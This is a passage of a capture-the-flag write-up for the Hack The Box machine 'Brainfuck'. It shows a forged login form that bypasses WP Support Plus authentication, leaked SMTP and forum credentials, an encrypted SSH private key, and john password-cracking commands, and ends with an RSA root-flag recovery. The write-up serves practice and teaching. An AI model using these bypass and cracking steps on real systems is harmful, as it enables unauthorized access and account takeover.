punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n        Username: \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Einput\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Etype\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Etext\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ename\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Eusername\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Evalue\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Eadmin\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Einput\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Etype\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Ehidden\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ename\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Eemail\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Evalue\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Eorestis@brainfuck.htb\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Einput\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Etype\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Ehidden\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ename\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Eaction\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Evalue\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003EloginGuestFacebook\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n        \u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Einput\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Etype\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Esubmit\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Evalue\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003ELogin\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\n\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u002F\u003C\u002Fspan\u003Eform\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe file is hosted using the command below.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Epython3 -m http.server 80\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424063117997.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003Eit is then viewed using a browser.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424063217601.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003EVulnerability Explanation:\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EWhen inspecting the traffic in Burpsuite, it can be concluded that the WP Support Plus plugin sets an authenticated cookie to the user without the need of a password.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424064212334.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424064603321.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EOnce the script is ran, when refreshing the wordpress site, the cookies take effect and, the attacker is automatically authenticated.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424064609386.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"smtp-credentials-leaked\"\u003ESMTP Credentials leaked\u003C\u002Fh3\u003E\n\u003Cp\u003EGoing to the \u003Cstrong\u003EEasy WP SMTP\u003C\u002Fstrong\u003E plugin, information about the user can be found.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424065221953.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EIn developers console, the password can be seen in cleartext.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424065348596.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-html\"\u003E\u003Ccode class=\"language-html\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token tag\"\u003E\u003Cspan class=\"token punctuation\"\u003E&lt;\u003C\u002Fspan\u003Einput\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Etype\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Epassword\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Ename\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003Eswpsmtp_smtp_password\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E \u003Cspan class=\"token attr-name\"\u003Evalue\u003C\u002Fspan\u003E\u003Cspan class=\"token attr-value\"\u003E\u003Cspan class=\"token punctuation attr-equals\"\u003E=\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003EkHGuERB29DNiNE\u003Cspan class=\"token punctuation\"\u003E\"\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003Cspan class=\"token punctuation\"\u003E\u003E\u003C\u002Fspan\u003E\u003C\u002Fspan\u003E\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003ESMTP Credential: \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003Eorestis:kHGuERB29DNiNE\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"evolution-mail-client\"\u003EEvolution Mail Client\u003C\u002Fh3\u003E\n\u003Cp\u003EEvolution mail client is configured as shown below to see user orestis mails.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424070158690.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424070425913.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424070431548.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424070507569.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EAfter configuring evolution, user orestis mail can be viewed.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424070539798.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003ENew credentials are revealed, it is for the forum found on the subdomain \u003Cstrong\u003Esup3rs3cr3t.brainfuck.htb\u003C\u002Fstrong\u003E \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424070838384.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003EHi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Ch2 id=\"sup3rs3cr3tbrainfuckhtb-1\"\u003Esup3rs3cr3t.brainfuck.htb\u003C\u002Fh2\u003E\n\u003Cp\u003EUsing the above credentials, the user orestic can now be accessed on the forum \u003Cstrong\u003Esup3rs3cr3t.brainfuck.htb\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003EThere are 3 topics listed in the forum:\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003EKey\u003C\u002Fli\u003E\n\u003Cli\u003ESSH Access\u003C\u002Fli\u003E\n\u003Cli\u003EDevelopment\u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424071528025.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EIt can be observed that user orestis always signs with the phrase \u003Cem\u003EOrestis - Hacking for fun and profit\u003C\u002Fem\u003E on topic \u003Cstrong\u003ESSH Access\u003C\u002Fstrong\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424072018596.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EHowever on topic \u003Cstrong\u003EKey\u003C\u002Fstrong\u003E, the page is encrypted. But the same pattern can be seen as orestis always signs his posts with the same phrase \u003Cem\u003EOrestis - Hacking for fun and profit\u003C\u002Fem\u003E.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424072421469.png\" alt=\"\"\u003E \u003C\u002Fp\u003E\n\u003Ch3 id=\"decryption-of-the-posts\"\u003EDecryption of the posts\u003C\u002Fh3\u003E\n\u003Cp\u003EAfter researching the encryption method, it was concluded that it is a one time pad encryption technique also known as Vernam Cipher (One Time Pad Vigenere).\u003C\u002Fp\u003E\n\u003Cp\u003EUsing the website \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fwww.boxentriq.com\u002Fcode-breaking\u002Fone-time-pad\"\u003Ehttps:\u002F\u002Fwww.boxentriq.com\u002Fcode-breaking\u002Fone-time-pad\u003C\u002Fa\u003E, the key was found to be \u003Cstrong\u003EBRAINFUCKMYBRAINFUCKMYBRAINFU\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424073446093.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe same result can be crossed check on the website \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fwww.dcode.fr\u002Fvernam-cipher-vigenere\"\u003Ehttps:\u002F\u002Fwww.dcode.fr\u002Fvernam-cipher-vigenere\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424073724663.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EWhen decrypting what appeared to be a link \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"mnvze:\u002F\u002F10.10.10.17\u002F8zb5ra10m915218697q1h658wfoq0zc8\u002Ffrmfycu\u002Fsp_ptr\"\u003Emnvze:\u002F\u002F10.10.10.17\u002F8zb5ra10m915218697q1h658wfoq0zc8\u002Ffrmfycu\u002Fsp_ptr\u003C\u002Fa\u003E with the pad \u003Cstrong\u003EFUCKMYBRAINFUCKMYBRAINFUCKMYBR\u003C\u002Fstrong\u003E, it resulted to reveal a link to the user orestis ssh public key \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002F10.10.10.17\u002F8ba5aa10e915218697d1c658cdee0bb8\u002Forestis\u002Fid_rsa\"\u003Ehttps:\u002F\u002F10.10.10.17\u002F8ba5aa10e915218697d1c658cdee0bb8\u002Forestis\u002Fid_rsa\u003C\u002Fa\u003E\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424074619202.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Ecurl -sk https:\u002F\u002F10.10.10.17\u002F8ba5aa10e915218697d1c658cdee0bb8\u002Forestis\u002Fid_rsa -o orestis.enc \ncat orestis.enc \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe ssh key is an encrypted key and it needs to be decrypted in order to ssh as the orestis user.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424081016859.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382\n\nmneag\u002FYCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj\u002Frh\u002F\nB2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi\nW1ma\u002FV7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ\n7dKcg6AM\u002Fo9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ\nzxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum\noz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem\ndLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+\nFvt6pmMuix8hbipP112Us54yTv\u002FhyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT\nmcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs\nLSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk\u002FLS\u002FmLO4e0N3wEX+NtgVbq\nul9guSlobasIX5DkAcY+ER3j+\u002FYefpyEnYs+\u002FtfTT1oM+BR3TVSlJcOrvNmrIy59\nkrKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO\u002FV\ngdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA\nVwmM72XbaugmhKW25q\u002F46\u002FyL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn\nschqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt\nUX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn\nF7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M\nwZezLNip80XmcVJwGUYsdn+iB\u002FUPMddX12J30YUbtw\u002FR34TQiRFUhWLTFrmOaLab\nIql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreoxCI57axBQBqThEg\u002FHTCy\nIQPmHW36mxtc+IlMDExdLHWD7mnNuIdShiAR6bXYYSM3E725fzLE1MFu45VkHDiF\nmxy9EVQ+v49kg4yFwUNPPbsOppKc7gJWpS1Y\u002Fi+rDKg8ZNV3TIb5TAqIqQRgZqpP\nCvfPRpmLURQnvly89XX97JGJRSGJhbACqUMZnfwFpxZ8aPsVwsoXRyuub43a7GtF\n9DiyCbhGuF2zYcmKjR5EOOT7HsgqQIcAOMIW55q2FJpqH1+PU8eIfFzkhUY0qoGS\nEBFkZuCPyujYOTyvQZewyd+ax73HOI7ZHoy8CxDkjSbIXyALyAa7Ip3agdtOPnmi\n6hD+jxvbpxFg8igdtZlh9PsfIgkNZK8RqnPymAPCyvRm8c7vZFH4SwQgD5FXTwGQ\n-----END RSA PRIVATE KEY-----\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003EThe password is cracked using john.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-powershell\"\u003E\u003Ccode class=\"language-powershell\"\u003E# cracked on windows\npython .\u002Frun\u002Fssh2john.py .\u002Fhashes\u002Fbrainfuck-orestis.enc.txt | Out-File .\u002Fhashes\u002Fbrainfuck-orestis.txt\n\n# if having error: Error: UTF-16 BOM seen in input file.\n# open .\u002Fhashes\u002Fbrainfuck-orestis.txt in sublime and save with encoding utf-8\n\n.\u002Frun\u002Fjohn.exe --wordlist=\"D:\u002FDocuments\u002FBug Bounty\u002FSecLists\u002FPasswords\u002FLeaked-Databases\u002Frockyou.txt\" .\u002Fhashes\u002Fbrainfuck-orestis.txt\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424083739076.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cpre class=\"language-\"\u003E\u003Ccode class=\"language-\"\u003E3poulakia!       (.\\hashes\\brainfuck-orestis.enc.txt)\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003ESSH credential:\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003Eorestis:3poulakia!\u003C\u002Fstrong\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"ssh-as-orestis\"\u003ESSH as orestis\u003C\u002Fh3\u003E\n\u003Cp\u003EUsing the password \u003Cstrong\u003E3poulakia!\u003C\u002Fstrong\u003E, brainfuck.htb can be access as the user orestis.\u003C\u002Fp\u003E\n\u003Cpre class=\"language-bash\"\u003E\u003Ccode class=\"language-bash\"\u003Echmod 600 orestis.enc \nssh -i orestis.enc orestis@brainfuck.htb \u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424084309613.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Ch3 id=\"usertxt\"\u003EUser.txt\u003C\u002Fh3\u003E\n\u003Cp\u003EUser.txt can be found in the home directory of orestis.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424084553996.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Euser.txt: 2c11cfbc5b959f73ac15a3310bd097c9\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n\u003Ch3 id=\"roottxt\"\u003ERoot.txt\u003C\u002Fh3\u003E\n\u003Cp\u003EThere are some uncommon files which are only readable by orestis\u003C\u002Fp\u003E\n\u003Cul\u003E\n\u003Cli\u003Eencrypt.sage\u003C\u002Fli\u003E\n\u003Cli\u003Edebug.txt\u003C\u002Fli\u003E\n\u003Cli\u003Eoutput.txt \u003C\u002Fli\u003E\n\u003C\u002Ful\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424084857346.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe file \u003Cstrong\u003Eencrypt.sage\u003C\u002Fstrong\u003E is a python script which looks to be doing an RSA cipher on \u002Froot\u002Froot.txt\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424085249183.png\" alt=\"\"\u003E \u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cstrong\u003Eencrypt.sage\u003C\u002Fstrong\u003E:\u003C\u002Fp\u003E\n\u003Cpre class=\"language-python\"\u003E\u003Ccode class=\"language-python\"\u003Enbits = 1024\n\npassword = open(\"\u002Froot\u002Froot.txt\").read().strip()\nenc_pass = open(\"output.txt\",\"w\")\ndebug = open(\"debug.txt\",\"w\")\nm = Integer(int(password.encode('hex'),16))\n\np = random_prime(2^floor(nbits\u002F2)-1, lbound=2^floor(nbits\u002F2-1), proof=False)\nq = random_prime(2^floor(nbits\u002F2)-1, lbound=2^floor(nbits\u002F2-1), proof=False)\nn = p*q\nphi = (p-1)*(q-1)\ne = ZZ.random_element(phi)\nwhile gcd(e, phi) != 1:\n    e = ZZ.random_element(phi)\n\n\n\nc = pow(m, e, n)\nenc_pass.write('Encrypted Password: '+str(c)+'\\n')\ndebug.write(str(p)+'\\n')\ndebug.write(str(q)+'\\n')\ndebug.write(str(e)+'\\n')\u003C\u002Fcode\u003E\u003C\u002Fpre\u003E\u003Cp\u003E\u003Cstrong\u003Eoutput.txt\u003C\u002Fstrong\u003E contains \u003Cstrong\u003Ec\u003C\u002Fstrong\u003E, and \u003Cstrong\u003Edebug.txt\u003C\u002Fstrong\u003E contains \u003Cstrong\u003Ep\u003C\u002Fstrong\u003E,\u003Cstrong\u003Eq\u003C\u002Fstrong\u003E and \u003Cstrong\u003Ee\u003C\u002Fstrong\u003E respectively.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424105245632.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cp\u003EThe content of \u003Cstrong\u003E\u002Froot\u002Froot.txt\u003C\u002Fstrong\u003E can be easily decrypted given all the above information.\u003C\u002Fp\u003E\n\u003Cp\u003EUsing the website \u003Ca target=\"_blank\" rel=\"nofollow\" href=\"https:\u002F\u002Fwww.dcode.fr\u002Frsa-cipher\"\u003Ehttps:\u002F\u002Fwww.dcode.fr\u002Frsa-cipher\u003C\u002Fa\u003E, the original content of \u003Cstrong\u003E\u002Froot\u002Froot.txt\u003C\u002Fstrong\u003E can be obtained.\u003C\u002Fp\u003E\n\u003Cp\u003E\u003Cimg src=\"brainfuck.assets\u002Fimage-20210424090253551.png\" alt=\"\"\u003E\u003C\u002Fp\u003E\n\u003Cblockquote\u003E\n\u003Cp\u003Eroot.txt: 6efc1a5dbb8904751ce6566a305bb8ef\u003C\u002Fp\u003E\n\u003C\u002Fblockquote\u003E\n",date:"2021-04-24",excerpt:"",printDate:"April 24, 2021",printReadingTime:"5 min read"}}]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/logbook/service-worker.js');(function(){try{eval("async function x(){}");var main="/logbook/client/client.92aecc44.js"}catch(e){main="/logbook/client/legacy/client.49c5bc27.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/logbook/client/shimport@1.0.1.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> 